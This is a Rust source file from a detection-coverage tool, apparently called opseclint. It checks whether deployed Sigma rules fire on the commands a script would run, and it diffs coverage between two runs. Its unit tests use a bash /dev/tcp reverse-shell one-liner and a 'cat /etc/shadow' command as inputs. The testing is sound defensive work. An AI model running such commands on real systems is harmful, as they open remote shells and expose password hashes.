//! Coverage-gap analysis. For each analyzed action, checks whether the deployed
//! ruleset actually *fires* on it. Surfacing the purple-team blind spots:
//! actions whose ATT&CK techniques have rules, yet none of those rules would
//! trigger on this specific command.

use std::collections::BTreeMap;

use serde::{Deserialize, Serialize};

use crate::kb::Platform;
use crate::model::Report;
use crate::sigma::SigmaIndex;
use crate::sigma_eval::{self, Outcome};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum Coverage {
    /// At least one rule fires on this action.
    Covered,
    /// Rules exist for the action's technique(s), but none fire. Known blind spot.
    Gap,
    /// Rules exist but only evaluate to INDETERMINATE (need host fields).
    Indeterminate,
    /// No rule in the ruleset covers the action's technique(s) at all.
    NoRules,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CoverageResult {
    pub line: usize,
    pub rule_id: String,
    pub description: String,
    pub techniques: Vec<String>,
    pub coverage: Coverage,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub firing: Vec<String>,
}

/// A saveable coverage-gaps run: the platform, ruleset size, and per-action
/// results. Serialized by `--coverage-gaps --json` and read back by `--diff`.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CoverageReport {
    pub platform: String,
    pub rules_indexed: usize,
    pub results: Vec<CoverageResult>,
}

/// Classify every finding in `report` against the Sigma `index`.
pub fn analyze(report: &Report, index: &SigmaIndex, platform: Platform) -> Vec<CoverageResult> {
    let mut out = Vec::new();
    for f in &report.findings {
        let tids: Vec<String> = f.techniques.iter().map(|t| t.id.clone()).collect();
        let candidates = index.rules_for(&tids);
        let mut firing = Vec::new();

        let coverage = if candidates.is_empty() {
            Coverage::NoRules
        } else if let Some(cmd) = &f.matched_command {
            let mut any_fire = false;
            let mut any_indet = false;
            for c in &candidates {
                match &c.rule {
                    // Against real telemetry, evaluate on the recorded event so a
                    // rule needing a field the command line can't supply can still
                    // count as covered.
                    Some(dr) => {
                        let outcome = match &f.observed_event {
                            Some(ev) => {
                                sigma_eval::evaluate_observed(dr, cmd, platform, ev).outcome
                            }
                            None => sigma_eval::evaluate(dr, cmd, platform).outcome,
                        };
                        match outcome {
                            Outcome::Fires => {
                                any_fire = true;
                                firing.push(c.title.clone());
                            }
                            Outcome::Indeterminate => any_indet = true,
                            Outcome::NoFire => {}
                        }
                    }
                    None => any_indet = true, // rule couldn't be lowered to logic
                }
            }
            if any_fire {
                Coverage::Covered
            } else if any_indet {
                Coverage::Indeterminate
            } else {
                Coverage::Gap
            }
        } else {
            Coverage::Indeterminate
        };

        out.push(CoverageResult {
            line: f.line,
            rule_id: f.rule_id.clone(),
            description: f.description.clone(),
            techniques: tids,
            coverage,
            firing,
        });
    }
    out
}

/// Number of results classified as a blind-spot gap.
pub fn gap_count(results: &[CoverageResult]) -> usize {
    results
        .iter()
        .filter(|r| r.coverage == Coverage::Gap)
        .count()
}

/// Render a human-readable coverage report in the Tokyo Night palette.
pub fn render(
    results: &[CoverageResult],
    platform: &str,
    rules_indexed: usize,
    color: bool,
) -> String {
    use crate::theme::{self, Painter};
    use std::fmt::Write as _;

    let p = Painter::new(color);
    let mut out = String::new();

    let _ = writeln!(
        out,
        "{}{}",
        p.bold(theme::BLUE, "opseclint"),
        p.paint(
            theme::COMMENT,
            &format!(" · coverage gaps · {platform} vs {rules_indexed} rules")
        )
    );
    let _ = writeln!(out, "{}", p.rule(60));

    let (mut covered, mut gaps, mut indet, mut norules) = (0, 0, 0, 0);
    for r in results {
        let (glyph, col, label, note) = match r.coverage {
            Coverage::Gap => {
                gaps += 1;
                (
                    "⚠",
                    theme::RED,
                    "GAP     ",
                    "rule(s) exist for its technique(s), but none fire".to_string(),
                )
            }
            Coverage::Covered => {
                covered += 1;
                (
                    "✓",
                    theme::GREEN,
                    "COVERED ",
                    format!("fires: {}", r.firing.join("; ")),
                )
            }
            Coverage::Indeterminate => {
                indet += 1;
                (
                    "?",
                    theme::YELLOW,
                    "INDET   ",
                    "needs host fields to confirm".to_string(),
                )
            }
            Coverage::NoRules => {
                norules += 1;
                (
                    "·",
                    theme::COMMENT,
                    "NO-RULES",
                    "no rule in this ruleset covers its technique(s)".to_string(),
                )
            }
        };
        let techs = r
            .techniques
            .iter()
            .map(|t| p.paint(theme::PURPLE, t))
            .collect::<Vec<_>>()
            .join(&p.paint(theme::COMMENT, ", "));
        let _ = writeln!(
            out,
            " {} {}  {}  {} {}{}{}",
            p.paint(col, glyph),
            p.paint(col, label),
            p.paint(theme::COMMENT, &format!("L{}", r.line)),
            p.paint(theme::FG, &r.description),
            p.paint(theme::COMMENT, "["),
            techs,
            p.paint(theme::COMMENT, "]"),
        );
        let _ = writeln!(out, "        {}", p.paint(theme::COMMENT, &note));
    }

    let _ = writeln!(out, "{}", p.rule(60));
    let gap_col = if gaps > 0 { theme::RED } else { theme::GREEN };
    let _ = writeln!(
        out,
        " {}  {} {}",
        p.bold(theme::FG, "summary"),
        p.paint(gap_col, &format!("⚠ {gaps} gap")),
        p.paint(
            theme::COMMENT,
            &format!("· {covered} covered · {indet} indeterminate · {norules} no-rules")
        ),
    );
    out
}

/// Serialize a coverage run for later `--diff` comparison.
pub fn render_json(report: &CoverageReport) -> String {
    serde_json::to_string_pretty(report).unwrap_or_else(|e| format!("{{\"error\":\"{e}\"}}"))
}

impl Coverage {
    fn label(self) -> &'static str {
        match self {
            Coverage::Covered => "COVERED",
            Coverage::Gap => "GAP",
            Coverage::Indeterminate => "INDET",
            Coverage::NoRules => "NO-RULES",
        }
    }

    /// Ranking used when collapsing an action seen on several lines: keep its
    /// best coverage state (covered > indeterminate > gap > no-rules).
    fn rank(self) -> u8 {
        match self {
            Coverage::Covered => 3,
            Coverage::Indeterminate => 2,
            Coverage::Gap => 1,
            Coverage::NoRules => 0,
        }
    }
}

/// A rule whose coverage state moved between two runs.
#[derive(Debug, Clone, Serialize)]
pub struct CoverageTransition {
    pub rule_id: String,
    pub description: String,
    pub techniques: Vec<String>,
    pub before: Coverage,
    pub after: Coverage,
}

/// The delta between two coverage-gaps runs — which blind spots closed, which
/// opened, and everything that otherwise shifted.
#[derive(Debug, Clone, Serialize)]
pub struct CoverageDelta {
    pub platform: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub platform_mismatch: Option<String>,
    /// Improved to `covered` (blind spot closed).
    pub closed: Vec<CoverageTransition>,
    /// Regressed away from `covered` (blind spot opened).
    pub opened: Vec<CoverageTransition>,
    /// Other status transitions (e.g. no-rules → gap).
    pub changed: Vec<CoverageTransition>,
    pub added: Vec<CoverageResult>,
    pub removed: Vec<CoverageResult>,
    pub baseline_gaps: usize,
    pub current_gaps: usize,
    pub baseline_covered: usize,
    pub current_covered: usize,
}

impl CoverageDelta {
    /// True when coverage regressed: a previously-covered action became a blind
    /// spot, or the total gap count rose. Drives the `--ci` gate for this mode.
    pub fn has_regressed(&self) -> bool {
        !self.opened.is_empty() || self.current_gaps > self.baseline_gaps
    }

    pub fn is_empty(&self) -> bool {
        self.closed.is_empty()
            && self.opened.is_empty()
            && self.changed.is_empty()
            && self.added.is_empty()
            && self.removed.is_empty()
    }
}

/// Collapse per-line results into one entry per rule, keeping its best coverage.
fn collapse(results: &[CoverageResult]) -> BTreeMap<String, CoverageResult> {
    let mut map: BTreeMap<String, CoverageResult> = BTreeMap::new();
    for r in results {
        map.entry(r.rule_id.clone())
            .and_modify(|e| {
                if r.coverage.rank() > e.coverage.rank() {
                    *e = r.clone();
                }
            })
            .or_insert_with(|| r.clone());
    }
    map
}

/// Compute the coverage delta of `current` relative to `baseline`.
pub fn compute_delta(baseline: &CoverageReport, current: &CoverageReport) -> CoverageDelta {
    let base = collapse(&baseline.results);
    let curr = collapse(&current.results);

    let (mut closed, mut opened, mut changed) = (Vec::new(), Vec::new(), Vec::new());
    let mut added = Vec::new();
    for (id, c) in &curr {
        match base.get(id) {
            None => added.push(c.clone()),
            Some(b) if b.coverage != c.coverage => {
                let t = CoverageTransition {
                    rule_id: c.rule_id.clone(),
                    description: c.description.clone(),
                    techniques: c.techniques.clone(),
                    before: b.coverage,
                    after: c.coverage,
                };
                if c.coverage == Coverage::Covered {
                    closed.push(t);
                } else if b.coverage == Coverage::Covered {
                    opened.push(t);
                } else {
                    changed.push(t);
                }
            }
            Some(_) => {}
        }
    }
    let removed: Vec<CoverageResult> = base
        .iter()
        .filter(|(id, _)| !curr.contains_key(*id))
        .map(|(_, b)| b.clone())
        .collect();

    for v in [&mut closed, &mut opened, &mut changed] {
        v.sort_by(|a, b| a.rule_id.cmp(&b.rule_id));
    }
    let count = |m: &BTreeMap<String, CoverageResult>, cov: Coverage| {
        m.values().filter(|r| r.coverage == cov).count()
    };

    CoverageDelta {
        platform: current.platform.clone(),
        platform_mismatch: (baseline.platform != current.platform)
            .then(|| baseline.platform.clone()),
        closed,
        opened,
        changed,
        added,
        removed,
        baseline_gaps: count(&base, Coverage::Gap),
        current_gaps: count(&curr, Coverage::Gap),
        baseline_covered: count(&base, Coverage::Covered),
        current_covered: count(&curr, Coverage::Covered),
    }
}

/// Render a coverage delta as pretty JSON.
pub fn render_delta_json(delta: &CoverageDelta) -> String {
    serde_json::to_string_pretty(delta).unwrap_or_else(|e| format!("{{\"error\":\"{e}\"}}"))
}

/// Render a coverage delta for a terminal in the Tokyo Night palette.
pub fn render_delta(delta: &CoverageDelta, color: bool) -> String {
    use crate::theme::{self, Painter};
    use std::fmt::Write as _;

    let p = Painter::new(color);
    let mut out = String::new();

    let _ = writeln!(
        out,
        "{}{}",
        p.bold(theme::BLUE, "opseclint"),
        p.paint(
            theme::COMMENT,
            &format!(" · coverage-gap diff · {}", delta.platform)
        )
    );
    if let Some(base_plat) = &delta.platform_mismatch {
        let _ = writeln!(
            out,
            "{}",
            p.paint(
                theme::YELLOW,
                &format!(
                    "  ! baseline platform was {base_plat}, current is {}",
                    delta.platform
                )
            )
        );
    }
    let _ = writeln!(
        out,
        "{}",
        p.paint(
            theme::COMMENT,
            &format!(
                "gaps {} → {} · covered {} → {}",
                delta.baseline_gaps,
                delta.current_gaps,
                delta.baseline_covered,
                delta.current_covered
            )
        )
    );
    let _ = writeln!(out, "{}", p.rule(60));

    if delta.is_empty() {
        let _ = writeln!(out, " {}", p.paint(theme::FG_DIM, "No coverage change."));
    }

    let transition = |p: &Painter, glyph: &str, col: &str, label: &str, t: &CoverageTransition| {
        let techs = t
            .techniques
            .iter()
            .map(|x| p.paint(theme::PURPLE, x))
            .collect::<Vec<_>>()
            .join(&p.paint(theme::COMMENT, ", "));
        format!(
            " {} {}  {}  {} {} {} {}{}{}\n",
            p.paint(col, glyph),
            p.paint(col, label),
            p.paint(theme::FG, &t.description),
            p.paint(theme::COMMENT, t.before.label()),
            p.paint(theme::COMMENT, "→"),
            p.paint(col, t.after.label()),
            p.paint(theme::COMMENT, "["),
            techs,
            p.paint(theme::COMMENT, "]"),
        )
    };
    for t in &delta.closed {
        out.push_str(&transition(&p, "✓", theme::GREEN, "CLOSED ", t));
    }
    for t in &delta.opened {
        out.push_str(&transition(&p, "⚠", theme::RED, "OPENED ", t));
    }
    for t in &delta.changed {
        out.push_str(&transition(&p, "~", theme::YELLOW, "CHANGED", t));
    }
    for r in &delta.added {
        let _ = writeln!(
            out,
            " {}  {} {}",
            p.paint(theme::COMMENT, "+ ADDED  "),
            p.paint(theme::FG_DIM, &r.description),
            p.paint(theme::COMMENT, &format!("({})", r.coverage.label())),
        );
    }
    for r in &delta.removed {
        let _ = writeln!(
            out,
            " {}  {} {}",
            p.paint(theme::COMMENT, "- REMOVED"),
            p.paint(theme::FG_DIM, &r.description),
            p.paint(theme::COMMENT, &format!("({})", r.coverage.label())),
        );
    }

    let _ = writeln!(out, "{}", p.rule(60));
    let trend = if delta.has_regressed() {
        p.paint(theme::RED, "coverage regressed")
    } else if !delta.closed.is_empty() {
        p.paint(theme::GREEN, "coverage improved")
    } else {
        p.paint(theme::COMMENT, "no regression")
    };
    let _ = writeln!(
        out,
        " {}  {} · {} · {} · {}",
        p.bold(theme::FG, "summary"),
        p.paint(theme::GREEN, &format!("{} closed", delta.closed.len())),
        p.paint(theme::RED, &format!("{} opened", delta.opened.len())),
        p.paint(theme::YELLOW, &format!("{} changed", delta.changed.len())),
        trend,
    );
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{analyzer, kb, sigma::SigmaIndex};
    use std::path::PathBuf;

    fn index() -> SigmaIndex {
        let dir = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/sigma");
        SigmaIndex::load_dir(&dir, "linux").expect("index loads")
    }

    fn coverage_of(command: &str, rule_id: &str) -> Coverage {
        let kb = kb::load(kb::Platform::LinuxAuditd).unwrap();
        let report = analyzer::analyze(command, &kb);
        let results = analyze(&report, &index(), kb::Platform::LinuxAuditd);
        // Find the result for the finding of interest (match by matching line's
        // finding via description contains). Simpler: take the strongest match.
        let finding = report
            .findings
            .iter()
            .position(|f| f.rule_id == rule_id)
            .expect("finding exists");
        results[finding].coverage
    }

    #[test]
    fn covered_when_a_rule_fires() {
        // The /dev/tcp reverse-shell rule (CommandLine contains /dev/tcp/) fires.
        assert_eq!(
            coverage_of(
                "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                "reverse-shell-devtcp"
            ),
            Coverage::Covered
        );
    }

    #[test]
    fn indeterminate_when_rule_needs_unavailable_field() {
        // The shadow fixture keys on TargetFilename, which we can't synthesize.
        assert_eq!(
            coverage_of("cat /etc/shadow", "shadow-read"),
            Coverage::Indeterminate
        );
    }

    #[test]
    fn no_rules_when_technique_absent_from_ruleset() {
        // T1033 (whoami) has no rule in the fixture set.
        assert_eq!(coverage_of("whoami", "whoami"), Coverage::NoRules);
    }

    fn cov_report(platform: &str, entries: &[(&str, Coverage)]) -> CoverageReport {
        CoverageReport {
            platform: platform.into(),
            rules_indexed: 1,
            results: entries
                .iter()
                .enumerate()
                .map(|(i, (id, cov))| CoverageResult {
                    line: i + 1,
                    rule_id: (*id).into(),
                    description: format!("desc {id}"),
                    techniques: vec!["T1059".into()],
                    coverage: *cov,
                    firing: vec![],
                })
                .collect(),
        }
    }

    #[test]
    fn delta_classifies_closed_opened_and_changed() {
        let base = cov_report(
            "linux-auditd",
            &[
                ("a", Coverage::Gap),     // will close (-> covered)
                ("b", Coverage::Covered), // will open (-> gap)
                ("c", Coverage::NoRules), // will change (-> gap)
                ("d", Coverage::Covered), // unchanged
            ],
        );
        let curr = cov_report(
            "linux-auditd",
            &[
                ("a", Coverage::Covered),
                ("b", Coverage::Gap),
                ("c", Coverage::Gap),
                ("d", Coverage::Covered),
            ],
        );
        let delta = compute_delta(&base, &curr);
        assert_eq!(
            delta
                .closed
                .iter()
                .map(|t| t.rule_id.as_str())
                .collect::<Vec<_>>(),
            ["a"]
        );
        assert_eq!(
            delta
                .opened
                .iter()
                .map(|t| t.rule_id.as_str())
                .collect::<Vec<_>>(),
            ["b"]
        );
        assert_eq!(
            delta
                .changed
                .iter()
                .map(|t| t.rule_id.as_str())
                .collect::<Vec<_>>(),
            ["c"]
        );
        assert!(delta.has_regressed()); // b opened
    }

    #[test]
    fn delta_is_clean_when_nothing_moves() {
        let r = cov_report("linux-auditd", &[("a", Coverage::Covered)]);
        let delta = compute_delta(&r, &r);
        assert!(delta.is_empty());
        assert!(!delta.has_regressed());
    }
}
